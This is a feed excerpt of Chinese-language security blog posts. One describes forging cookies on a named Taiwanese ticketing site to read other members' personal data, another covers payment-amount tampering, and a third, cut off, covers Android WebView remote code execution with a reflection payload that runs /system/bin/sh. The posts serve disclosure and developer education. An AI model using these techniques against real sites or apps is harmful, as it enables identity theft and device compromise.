&lt;p&gt;然而這樣做還是存在些微風險，一旦這個加解密方式被找到，攻擊者就得以修改 Cookie 內容，進而盜用別人身分。在本例中，若想憑著改變 Cookie 盜用別人身分其實可以不用花時間去解加密法，這裡有一個小 trick，我們從觀察中馬上就能發現所有 Cookie 值都是用同一套加密方式，而且其中 USER_EMAIL、USER_NAME 這些還是我們可以修改的值。這也意味著如果我們把姓名改成我們想要加密的身分證字號，伺服器就會回傳一個加密好的值給 USER_NAME。我們直接來修改姓名看看：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;h/assets/img/blog/20150130/change_name.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150130/change_name.png&quot; alt=&quot;修改姓名成身分證字號&quot; title=&quot;修改姓名成身分證字號&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;當姓名改成目標 Z239398899 時，Cookie 中的 USER_NAME 值就會改變成我們要的加密結果。耶！是一種作業不會寫找出題老師幫忙寫的概念 XD&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150130/user_B_cookie.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150130/user_B_cookie.png&quot; alt=&quot;改變第一個使用者 cookie&quot; title=&quot;改變第一個使用者 cookie&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;接著直接把 USER_NAME 的值拿來用，複製貼上到目標欄位 USER_ACCOUNT 中，之後就是以 Z239398899 的身分來讀取網頁了。我們再讀取一次 https://www.jody-ticket.com.tw/UTK0196_.aspx 看看：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150130/user_B_data.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150130/user_B_data.png&quot; alt=&quot;第二個使用者個資&quot; title=&quot;第二個使用者個資&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;成功看到 Z239398899 的資料了！如此，就可以只憑一個身分證字號讀到他人的地址電話資訊，甚至可以幫別人搶票或取消票券。這個流程寫成程式後只要兩個 request 就可以嘗試登入一個身分證字號，要大量偷取會員個資也是可行的了。&lt;/p&gt;

&lt;p&gt;說到這邊，也許有人會質疑要猜中註冊帳戶的身分證字號是有難度的，但其實要列舉出全台灣可能在使用的身分證字號並不困難，再加上宏碁雲端的硬體其實是很不錯的，事實也證明它能夠在&lt;a href=&quot;https://tw.news.yahoo.com/%E6%B1%9F%E8%95%99%E5%8A%A0%E5%A0%B4%E5%94%AE%E7%A5%A8-%E9%A7%AD%E5%AE%A2%E6%94%BB%E6%93%8A4000%E8%90%AC%E6%AC%A1-041458504.html&quot;&gt;短時間處理四千萬個請求系統仍保持穩定&lt;/a&gt;，只要攻擊者網路不要&lt;a href=&quot;http://www.cna.com.tw/news/afe/201501250162-1.aspx&quot;&gt;卡在自家巷子口&lt;/a&gt;，多機器多線程佈下去猜身分證字號效率應該很可觀！&lt;/p&gt;

&lt;h3 id=&quot;建議原則&quot;&gt;建議原則&lt;/h3&gt;

&lt;p&gt;這次的問題是兩個弱點的組合攻擊：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Cookie 加密的內容可解也可偽造－透過網站幫忙&lt;/li&gt;
  &lt;li&gt;功能缺少權限控管 (Missing Function Level Access Control)－部分頁面只憑身分證字號就可存取個資&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;宏碁雲端售票為了效率和分流，使用 Cookie 認證是相當合理的設計，所以要解決這個問題，從第二點來解決會是最有效且符合成本的方式，怎麼改呢？推測原本的 SQL 語句應該類似這樣：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;USER&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;account&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;USER_ACCOUNT&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;由於 USER_ACCOUNT 是身分證字號，容易窮舉，更嚴謹的作法可以多判斷一個 id，像是這樣：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;USER&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;account&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;USER_ACCOUNT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;USER_ID&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;從只需要告訴伺服器身分證字號就回傳會員資料，到變成需要身分證字號和會員編號同時正確才會回傳會員資料，至此，攻擊者已經很難同時知道別人的會員編號和身分證字號了，因此大大降低了被猜中的機率，增加了安全性。&lt;/p&gt;

&lt;p&gt;Cookie 一直以來都是 Web Application Security 領域的兵家必爭之地，攻擊者無不絞盡腦汁想偷到或偽造它，前陣子舉辦的 &lt;a href=&quot;http://girls.hitcon.org/&quot;&gt;HITCON GIRLS&lt;/a&gt; Web 課堂練習題第一題就是改 Cookie 來偽造身分，足見這個問題有多基本和重要。&lt;/p&gt;

&lt;p&gt;關於 Cookie，這裡提供一點原則和概念供大家參考：&lt;/p&gt;

&lt;p&gt;首先，Cookie 是存在客戶端的，所以有機會被看到、被竄改、被其他人偷走。基於這些原因，不建議在 Cookie 中儲存機敏資料，或是存放會影響伺服器運作的重要參數，需評估一下這些暫存資料被人家看到或修改是不是沒差，這是儲存的原則。如果權衡後還是要在 Cookie 中存放重要資料，那就需要對值加密避免被讀改，而且要確保加密的強度以及其他人是否能透過其他方法解析修改。最後，Cookie 最常被偷走的方式是透過 JavaScript，所以建議在重要的 Cookie 加上 &lt;a href=&quot;https://devco.re/blog/2014/06/11/setcookie-httponly-security-issues-of-http-headers-3/&quot;&gt;HttpOnly flag&lt;/a&gt; 能有效的降低被偷走的機率。也來試著整理一下這一小段的重點：&lt;/p&gt;

&lt;ul class=&quot;devcore&quot;&gt;
  &lt;li&gt;機敏資料不要存&lt;/li&gt;
  &lt;li&gt;加密資訊不可少&lt;/li&gt;
  &lt;li&gt;設定標頭不怕駭&lt;/li&gt;
  &lt;li&gt;一次搞定沒煩惱&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;沒想到信手拈來就是三不一沒有，前面再加個勾勾，感覺好像很厲害呢！&lt;/p&gt;

&lt;h3 id=&quot;結論&quot;&gt;結論&lt;/h3&gt;

&lt;p&gt;由於 Cookie 存在瀏覽器端，有被竄改的可能，所以如果網站使用 Cookie 認證就會有一些安全上的風險。本篇就以宏碁雲端售票為例，說明這種小疏忽可能會造成被盜用帳號的風險。開發者在面對使用者可以改變的變數一定要特別小心處理，做好該有的防護，還是老話一句：使用者傳來的資料皆不可信！只要掌握這個原則，開發出來的產品就能夠少很多很多風險！&lt;/p&gt;

&lt;p&gt;行文至此，預期中是要再推廣一下漏洞回報平台，順便稱讚宏碁非常重視資安，修復快速，是良好的正循環。不過前兩天看到一些關於宏碁雲端售票的新聞時，上線發現此弱點仍未修復，這好像真的有點不應該，畢竟官方上週已經接收到通報，要修復這個弱點也只需一行判斷式…。能理解這次的弱點在短時間開發過程中很難被注意到，對於這樣一個一週不眠不休完成的售票網站，我其實也是給予滿高的評價，但如果官方能再增兩分對資安事件的重視，相信下次定能以滿分之姿呈現在使用者面前！&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2015/01/30/cookie-security-insight-acer/</link>
                <guid>https://devco.re/blog/2015/01/30/cookie-security-insight-acer</guid>
                <pubDate>Fri, 30 Jan 2015 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>從寬宏售票談資安</title>
                <description>&lt;p&gt;戴夫寇爾部落格停載了快兩個月，非常抱歉，讓各位常常催稿的朋友們久等了 &amp;lt;(_ _)&amp;gt;&lt;br /&gt;&lt;br /&gt;
今天就乘著全臺瘋買票的浪頭，來談談一些常被忽略的資訊安全小概念吧！&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;江蕙引退演唱會一票難求，隔岸觀了兩天火， 也忍不住想要當個鍵盤孝子。無奈運氣不好一直連不上主機，『Service Unavailable』畫面看膩了，只好看看暫存頁面的網頁原始碼，不看還好，一看我驚呆了！&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150109/kham_information_leakage.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150109/kham_information_leakage.png&quot; alt=&quot;寬宏售票資訊洩漏&quot; title=&quot;寬宏售票資訊洩漏&quot; /&gt;&lt;/a&gt;&lt;br /&gt;
（特別聲明：此流程中並無任何攻擊行為，該頁面是正常購票流程中出現的網頁）&lt;/p&gt;

&lt;p&gt;在結帳網頁原始碼當中竟然看到了疑似資料庫密碼 SqlPassWord 在表單裡面！這件事從資安的角度來看，除了表面上洩漏了資料庫密碼之外，還有兩個我想講很久但苦無機會談的資安議題，分別是金流串接常見的弱點以及駭客的心理。藉著寬宏售票網頁洩漏密碼這件事情，順道與大家分享分享吧！&lt;/p&gt;

&lt;h3 id=&quot;談台灣網站的金流串接&quot;&gt;談台灣網站的金流串接&lt;/h3&gt;

&lt;p&gt;在本篇的例子中，寬宏售票網頁表單出現了疑似資料庫密碼，這狀況就好像去銀行繳款，櫃檯給你一把鑰匙跟你說：『這是金庫的鑰匙，麻煩你到對面那個櫃檯把鑰匙給服務員，請他幫你把錢放進金庫裡面』。&lt;br /&gt;&lt;br /&gt;
是不是有點多此一舉，銀行本來就會有一份鑰匙，幹嘛要請你（瀏覽器）幫忙轉交？&lt;br /&gt;&lt;br /&gt;
如果今天壞人拿到了這把鑰匙，是不是只要繞過保全的視線，就可以打開金庫為所欲為？&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150109/3d_key_to_success.jpg&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150109/3d_key_to_success.jpg&quot; alt=&quot;key_to_success&quot; title=&quot;key_to_success&quot; /&gt;&lt;/a&gt;&lt;br /&gt;
&lt;br /&gt;（Photo by StockMonkeys.com）&lt;/p&gt;

&lt;p&gt;類似的狀況也滿常發生在電子商務與第三方金流服務的串接上。&lt;br /&gt;&lt;br /&gt;
許多電子商務網站專注於商務，選擇將付款步驟委託第三方金流服務處理，一般常見的流程是這樣的：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;電子商務訂單成立，電子商務網站給你一張單子，上面寫著：『訂單 123 號， 金額 456 元』，請你將單子轉交給第三方金流服務網站並繳款。&lt;/li&gt;
  &lt;li&gt;金流服務網站依據你給它的單據收取 456 元，並且跟電子商務網站說：『訂單 123 已成功繳款，款項 456 元』。&lt;/li&gt;
  &lt;li&gt;最後電子商務網站告訴你訂單 123 號購買成功。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;如果現在有一個惡意使用者，他做了以下惡搞：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;在步驟一把電子商務網站給的單子修改成：『訂單 123 號，金額 20 元』（原價是 456 元）&lt;/li&gt;
  &lt;li&gt;金流服務商依據單據跟惡意使用者收取 20 元費用，並且告訴電子商務網站：『訂單 123 已成功繳款，款項 20 元』&lt;/li&gt;
  &lt;li&gt;最後電子商務網站看到『訂單 123 已成功繳款』的訊息，就告訴使用者說訂單 123 購買成功。也就是惡意使用者只花取 20 元就購買到原價 456 元的產品。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;(聲明：為求精簡，電子商務與金流服務串接流程有經過簡化，有抓到精髓就好XD)&lt;/p&gt;

&lt;p&gt;不管是寬宏售票出現密碼欄位還是上例電子商務網站的金流串接，最大的問題在於他們都相信使用者會正常幫忙轉交，即靠客戶端的瀏覽器來轉址傳值。要知道，利用瀏覽器轉址傳值是不可靠的，一來，重要的資訊就會被客戶知道，例如寬宏售票疑似洩漏資料庫密碼；二來中間的內容可以修改，例如修改訂單金額。另外，可能有人會發現到，在惡意使用者的步驟三裡面，電子商務網站竟然沒有確認付款金額是否正確，沒錯，這是會發生的事情，在過去經驗中，像這樣沒有比對付款金額的台灣系統比例還不少，這些疏忽都會造成企業很多成本損失，不可不注意。&lt;/p&gt;

&lt;p&gt;台灣目前還滿常見到這種根據使用者傳來單據來收費的狀況，導致單據可竄改造成企業損失，某部分原因可以歸咎到早期第三方金流的範例都是這樣寫的，工程師也就直接延續這樣的寫法直到現在。以金流串接為例，比較好的處理方式有下面兩種：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;在單據上加入防偽標記，讓惡意使用者無法輕易竄改單據。在技術上作法有點類似 OAuth 在 Signing Request 時的作法，在請求中多送一組檢查碼，透過 one-way hash 的方式檢查網址是否有被修改，目前大部分金流商都有提供相似解法。&lt;/li&gt;
  &lt;li&gt;單據不再給使用者轉交，電子商務直接傳單子『訂單 123 號，金額 20 元』給金流服務網站，並請使用者直接去專屬的金流商窗口繳費即可。在技術上就是將瀏覽器轉址傳值的動作全部變成伺服器對伺服器溝通處理掉。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;以上兩種作法，將可以有效防止惡意使用者修改訂單金額。此外，建議電子商務網站在收到金流回傳的付款資訊後，能夠比對收取款項與訂單款項是否相符，如此雙重檢查，能大大避免惡意行為，減少企業處理惡意金流問題的成本。&lt;/p&gt;

&lt;h3 id=&quot;談駭客心理&quot;&gt;談駭客心理&lt;/h3&gt;

&lt;p&gt;很明顯的，寬宏售票洩漏密碼的狀況是工程師的小疏漏。在不知道資料庫確切位置的前提下，知道疑似資料庫密碼的東西確實也無法做什麼，頂多就是了解了一家公司制定密碼的策略。然而，看在駭客眼裡，這點疏失會代表著一個網站面對資安的態度。連顯而易見的問題都沒有注意，那後端程式應該也有可能出現漏洞。一旦駭客決定要攻擊這個網站，勢必會搬出比平常還要多的資源去嘗試，因為他們認為這個投資報酬率很高。&lt;/p&gt;

&lt;p&gt;一般駭客基本上會不斷的從所看到的網頁資訊來調整自己攻擊的強度，如果他們不斷看到了奇怪的登入畫面：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150109/kham_login_1.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150109/kham_login_1.png&quot; alt=&quot;寬宏售票登入頁面1&quot; title=&quot;寬宏售票登入頁面1&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;或是防火牆的登入畫面&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150109/kham_login_2.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150109/kham_login_2.png&quot; alt=&quot;寬宏售票登入頁面2&quot; title=&quot;寬宏售票登入頁面2&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;就很有可能會增加攻擊的力道。上面這種登入頁面就是就是一種常見的資訊洩漏，在今年台灣駭客年會的議程－「&lt;a href=&quot;https://devco.re/blog/2014/08/26/information-leakage-in-taiwan-HITCON2014/&quot;&gt;被遺忘的資訊洩漏&lt;/a&gt;」就提及了這類資訊洩漏在台灣是很普及的。注意，出現這樣的頁面並不意味著網站會有漏洞，只是網站容易因此多受到一些攻擊。反之，如果一個網站前端頁面寫的乾淨漂亮，甚至連 &lt;a href=&quot;https://devco.re/blog/2014/03/10/security-issues-of-http-headers-1/&quot;&gt;HTTP 安全 header&lt;/a&gt; 這種小細節都會注意到，駭客可能就會認為這個網站寫的很嚴謹，甚至連嘗試的慾望都沒有了。&lt;/p&gt;

&lt;p&gt;一個經驗豐富的駭客，通常光看首頁就能夠判斷該網站是否可能存有漏洞，憑藉的就是這些蛛絲馬跡。為了不讓自家網站常被路過的惡意使用者攻擊，加強網頁前端的呈現、網頁原始碼乾淨有架構、沒有太多資訊洩漏，這些都是很好的防禦方法。&lt;/p&gt;

&lt;h3 id=&quot;結論&quot;&gt;結論&lt;/h3&gt;

&lt;p&gt;在使用最近熱門的寬宏售票網站時，我們發現網頁原始碼存在一些疑似密碼的資訊。從這件事情出發，我們分別延伸探討了兩個工程師應該注意的議題：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;第一個議題提醒大家在開發的時候，重要的資訊千萬不要透過客戶端瀏覽器幫忙轉送，記住客戶端都是不可信的，多經一手就多一分風險。文中舉出了台灣電商網站在金流串接時也常出現這樣的問題，可能會造成訂單金額被竄改等企業會有所損失的問題。&lt;/li&gt;
  &lt;li&gt;第二個議題從駭客的心理來談資安，一個網站如果沒有什麼保護機制、輕易的洩漏網站資訊，非常容易挑起駭客想要嘗試入侵的慾望；反之，若一個網站從前端到使用流程都非常注意細節，一般駭客較會興致缺缺。嚴謹的前端呈現，就某種程度來說，也是一種對自身網站的保護。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;希望開發者看到上面這兩個議題有掌握到『別相信客戶端』、『駭客會因網站前端寫法不嚴謹而嘗試去攻擊』的重點，提昇自家網站的安全度吧！&lt;/p&gt;

&lt;p&gt;最後說個題外話，身為一個工程師，我認為資訊系統該帶給世界的好處是節省大家的時間，而這次搶票卻讓無數人徹夜排隊或守在電腦前不斷的『連不上、買票、失敗』循環。這也許能夠賺到大量的新聞版面，最終票也能全部賣光，但想到台灣有數十萬小時的生產力浪費在無意義的等待上，就覺得這個系統好失敗。現在的技術已經可以負荷這樣大規模的售票，&lt;a href=&quot;https://kktix.com/&quot;&gt;KKTIX&lt;/a&gt; 甚至可以&lt;a href=&quot;https://medium.com/@hlb/kktix-2015-01-7bf84c47dfdf&quot;&gt;一分鐘處理 10 萬張劃位票券&lt;/a&gt;！世界在進步，過去的技術也許就該讓它留在過去。有人說：『真正幸福的人：不是搶到票，是可以像江蕙一樣選擇人生』，希望我也可以變成一個幸福的人，可以選擇一個不塞車的售票系統。&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2015/01/09/information-security-insight-kham/</link>
                <guid>https://devco.re/blog/2015/01/09/information-security-insight-kham</guid>
                <pubDate>Fri, 09 Jan 2015 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Android WebView 為你的使用者打開了漏洞之門你知道嗎？</title>
                <description>&lt;p&gt;為了解決在應用程式中顯示網頁的需求，開發者一般會使用到由系統提供的 WebView 元件。而由於 JavaScript 被廣泛應用在網頁上，開發者通常也會把 WebView 處理 JavaScript 的功能打開，好讓大部分網頁能正常運作。但就在開啟這個像是必不可少的 JavaScript 功能時，背後一些由於系統漏洞而引發出來意想不到的風險卻有機會由此而生。接下來的部分將把這些漏洞為大家做個整理。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;相關漏洞&quot;&gt;相關漏洞&lt;/h3&gt;

&lt;h4 id=&quot;1-遠端代碼執行-remote-code-execution&quot;&gt;1. 遠端代碼執行 (Remote Code Execution)&lt;/h4&gt;

&lt;h5 id=&quot;風險木馬跳板個資被盜&quot;&gt;風險：木馬跳板，個資被盜&lt;/h5&gt;
&lt;p&gt;目前有機會發生 RCE 風險都圍繞在 &lt;a href=&quot;http://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface(java.lang.Object, java.lang.String)&quot;&gt;addJavascriptInterface&lt;/a&gt; 這個功能上，該功能原意是為被載入的網頁和原生程式間建立一個”橋樑”，通過預先設定好的介面，讓網頁能呼叫指定的公開函式並取得函式回傳的結果。&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;JsObject&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;Hello World&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;webView&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getSettings&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setJavaScriptEnabled&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;webView&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;addJavascriptInterface&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;JsObject&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;injectedObject&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;webView&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;loadUrl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;http://www.example.com/&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;…
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
       &lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;injectedObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// return &amp;quot;Hello World&amp;quot;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;…&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;像上面的例子裡，網頁能通過預先設定好的 “injectedObject” 介面，呼叫 “toString” 函式，得到 “Hello World” 這個字串。&lt;/p&gt;

&lt;p&gt;其漏洞 &lt;a href=&quot;http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2012-6636&quot;&gt;CVE-2012-6636&lt;/a&gt; 最早在2012年12月被&lt;a href=&quot;http://50.56.33.56/blog/?p=314&quot;&gt;公佈&lt;/a&gt;出來，攻擊者有機會利用他通過 Java Reflection API 來執行任意代碼。影響 Android 1.X ~ 4.1。&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cmdArgs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;injectedObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getClass&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;forName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;java.lang.Runtime&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                              &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getMethod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;getRuntime&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                              &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cmdArgs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;/system/bin/sh&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;-c&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;cat vuln &amp;gt;&amp;gt; attacker.txt&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;其後 Google 在 Android 4.2 開始對 &lt;a href=&quot;http://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface(java.lang.Object, java.lang.String)&quot;&gt;addJavascriptInterface&lt;/a&gt; 的使用方式加了限制，使用時需要在 Java 端把可被網頁執行的公開函式透過 @JavascriptInterface 來標註。並奉勸開發者別在 4.1 或之前的系統上使用 &lt;a href=&quot;http://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface(java.lang.Object, java.lang.String)&quot;&gt;addJavascriptInterface&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;可是是否開發者只要在受影響的系統上不主動使用 &lt;a href=&quot;http://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface(java.lang.Object, java.lang.String)&quot;&gt;addJavascriptInterface&lt;/a&gt; 就能解決問題呢？答案是否定的。&lt;/p&gt;

&lt;p&gt;在 Android 3.X ~ 4.1 上，WebView 預設會用 &lt;a href=&quot;http://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface(java.lang.Object, java.lang.String)&quot;&gt;addJavascriptInterface&lt;/a&gt; 添加一個叫 “searchBoxJavaBridge_” 的介面。開發者如果沒有注意的話就會同樣會讓使用者陷入風險中。很巧合地，從 Android 3.0 開始 Google 加入了 &lt;a href=&quot;http://developer.android.com/reference/android/webkit/WebView.html#removeJavascriptInterface(java.lang.String)&quot;&gt;removeJavascriptInterface&lt;/a&gt; 函式讓開發者可以移定指定的介面。所以開發者可以使用該函式在受影響的系統上把 “searchBoxJavaBridge_” 移除。&lt;/p&gt;

